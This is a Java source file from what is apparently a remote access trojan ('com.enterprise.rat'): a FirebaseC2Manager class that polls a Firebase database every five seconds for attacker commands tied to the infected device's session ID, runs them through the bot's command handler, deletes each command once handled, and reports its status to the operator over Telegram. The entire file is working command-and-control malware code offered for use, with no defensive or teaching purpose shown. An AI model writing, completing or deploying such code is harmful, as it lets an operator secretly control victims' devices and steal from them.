package com.enterprise.rat.commands;

import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import okhttp3.*;
import java.util.concurrent.TimeUnit;

public class FirebaseC2Manager {
    private static final String FIREBASE_URL = "https://rexent-c2-default-rtdb.firebaseio.com/";
    private static OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build();
    private boolean listening = false;
    private CommandHandler fallbackHandler;

    public FirebaseC2Manager(CommandHandler handler) { this.fallbackHandler = handler; }

    public void startListening() {
        if (listening) return;
        listening = true;
        new Thread(() -> {
            while (listening) {
                try {
                    String url = FIREBASE_URL + "commands/" + BotConfig.SESSION_ID + ".json";
                    Request req = new Request.Builder().url(url).get().build();
                    Response res = client.newCall(req).execute();
                    if (res.isSuccessful() && res.body() != null) {
                        String body = res.body().string();
                        if (body != null && !body.equals("null")) {
                            JsonObject cmd = JsonParser.parseString(body).getAsJsonObject();
                            String command = cmd.get("cmd").getAsString();
                            String args = cmd.has("args") ? cmd.get("args").getAsString() : "";
                            String fullCmd = "/" + command + " " + args;
                            fallbackHandler.handleCommand(fullCmd, BotConfig.ADMIN_CHAT_ID, "firebase", null);
                            // Clear command
                            Request delReq = new Request.Builder().url(url).delete().build();
                            client.newCall(delReq).execute();
                        }
                    }
                    if (res.body() != null) res.close();
                } catch (Exception e) {}
                try { Thread.sleep(5000); } catch (InterruptedException e) { break; }
            }
        }).start();
        TelegramApi.sendMessage("🔥 Firebase C2 fallback activated.");
    }

    public void stopListening() {
        listening = false;
        TelegramApi.sendMessage("🔥 Firebase C2 fallback stopped.");
    }
}
